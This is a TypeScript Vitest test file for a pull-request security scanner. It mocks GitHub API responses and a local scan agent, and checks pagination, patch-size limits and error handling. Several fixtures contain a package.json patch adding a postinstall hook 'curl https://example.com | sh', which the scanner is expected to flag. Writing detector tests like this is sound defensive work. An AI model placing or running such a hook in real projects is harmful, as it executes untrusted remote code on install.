import { beforeEach, describe, expect, it, vi } from "vitest";
import { scanPrLocally } from "../prScanner.js";

vi.mock("../../lib/logger.js", () => ({
  childLogger: () => ({
    error: vi.fn(),
    info: vi.fn(),
  }),
}));

describe("scanPrLocally", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.unstubAllGlobals();
  });

  it("collects PR files and invokes the prebuilt Flue PR scan service", async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({
        title: "Update build",
        body: "Adds install script",
        user: { login: "octocat" },
        base: { ref: "main", sha: "base-sha" },
        head: {
          ref: "feature",
          sha: "head-sha",
          repo: { full_name: "octocat/repo" },
        },
      }))
      .mockResolvedValueOnce(jsonResponse([
        {
          filename: "package.json",
          status: "modified",
          additions: 3,
          deletions: 1,
          changes: 4,
          patch: '@@ -1 +1 @@\n+"postinstall": "curl https://example.com | sh"',
        },
      ]))
      .mockResolvedValueOnce(jsonResponse({
        findings: [
          {
            category: "lifecycle",
            severity: "high",
            title: "Suspicious postinstall hook",
            file: "package.json",
            evidence: "postinstall runs curl | sh",
            recommendation: "Remove the lifecycle hook.",
          },
        ],
      }));
    vi.stubGlobal("fetch", fetchMock);

    const result = await scanPrLocally("acme", "repo", 12, {
      githubToken: "ghs_installation_token",
    });

    expect(fetchMock).toHaveBeenCalledWith(
      "https://api.github.com/repos/acme/repo/pulls/12",
      expect.objectContaining({
        headers: expect.objectContaining({
          Authorization: "Bearer ghs_installation_token",
        }),
      }),
    );
    expect(fetchMock).toHaveBeenCalledWith(
      "http://127.0.0.1:3583/agents/pr-scan/acme-repo-12",
      expect.objectContaining({
        method: "POST",
        headers: expect.objectContaining({ "Content-Type": "application/json" }),
      }),
    );
    const body = JSON.parse(fetchMock.mock.calls[2][1].body);
    expect(body.files[0]).toMatchObject({
      path: "package.json",
      status: "modified",
    });
    expect(result.findings?.[0]?.title).toBe("Suspicious postinstall hook");
  });

  it("includes files from later GitHub PR file pages in the Flue payload", async () => {
    const firstPageFiles = Array.from({ length: 100 }, (_, index) => ({
      filename: `benign-${index}.txt`,
      status: "modified",
      additions: 1,
      deletions: 0,
      changes: 1,
      patch: `@@ -0,0 +1 @@\n+benign ${index}`,
    }));
    const maliciousFile = {
      filename: "package.json",
      status: "modified",
      additions: 1,
      deletions: 0,
      changes: 1,
      patch: '@@ -1 +1 @@\n+"postinstall": "curl https://example.com | sh"',
    };
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({
        title: "Update build",
        body: "",
        user: { login: "octocat" },
      }))
      .mockResolvedValueOnce(jsonResponse(firstPageFiles))
      .mockResolvedValueOnce(jsonResponse([maliciousFile]))
      .mockResolvedValueOnce(jsonResponse({
        findings: [
          {
            category: "lifecycle",
            severity: "high",
            title: "Suspicious postinstall hook",
            file: "package.json",
            evidence: "postinstall runs curl | sh",
            recommendation: "Remove the lifecycle hook.",
          },
        ],
      }));
    vi.stubGlobal("fetch", fetchMock);

    const result = await scanPrLocally("acme", "repo", 12);

    expect(fetchMock).toHaveBeenCalledWith(
      "https://api.github.com/repos/acme/repo/pulls/12/files?per_page=100&page=2",
      expect.any(Object),
    );
    const body = JSON.parse(fetchMock.mock.calls[3][1].body);
    expect(body.files).toHaveLength(101);
    expect(body.files[100]).toMatchObject({
      path: "package.json",
      patch: expect.stringContaining("postinstall"),
    });
    expect(result.findings?.[0]?.file).toBe("package.json");
  });

  it("returns an error result when a file patch exceeds the per-file scan limit", async () => {
    const oversizedPatch = `${"a".repeat(8_000)}\n+"postinstall": "curl https://example.com | sh"`;
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({ title: "Update build", body: "", user: { login: "octocat" } }))
      .mockResolvedValueOnce(jsonResponse([
        {
          filename: "package.json",
          status: "modified",
          additions: 1,
          deletions: 0,
          changes: 1,
          patch: oversizedPatch,
        },
      ]));
    vi.stubGlobal("fetch", fetchMock);

    const result = await scanPrLocally("acme", "repo", 12);

    expect(result.error).toBe(
      "PR patch for package.json exceeds the 8000 character per-file scan limit",
    );
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });

  it("returns an error result when total patch payload exceeds the scan limit", async () => {
    const files = Array.from({ length: 13 }, (_, index) => ({
      filename: `file-${index}.txt`,
      status: "modified",
      additions: 1,
      deletions: 0,
      changes: 1,
      patch: "a".repeat(8_000),
    }));
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(jsonResponse({ title: "Update build", body: "", user: { login: "octocat" } }))
      .mockResolvedValueOnce(jsonResponse(files));
    vi.stubGlobal("fetch", fetchMock);

    const result = await scanPrLocally("acme", "repo", 12);

    expect(result.error).toBe(
      "Total PR patch payload exceeds the 100000 character scan limit before fully scanning file-12.txt",
    );
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });

  it("returns an inconclusive error result when Flue fails", async () => {
    vi.stubGlobal(
      "fetch",
      vi
        .fn()
        .mockResolvedValueOnce(jsonResponse({}))
        .mockResolvedValueOnce(jsonResponse([]))
        .mockResolvedValueOnce(new Response("Flue agent failed", { status: 500 })),
    );

    const result = await scanPrLocally("acme", "repo", 12);

    expect(result).toEqual({ error: "Flue PR scan returned 500: Flue agent failed" });
  });
});

function jsonResponse(body: unknown) {
  return new Response(JSON.stringify(body), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}
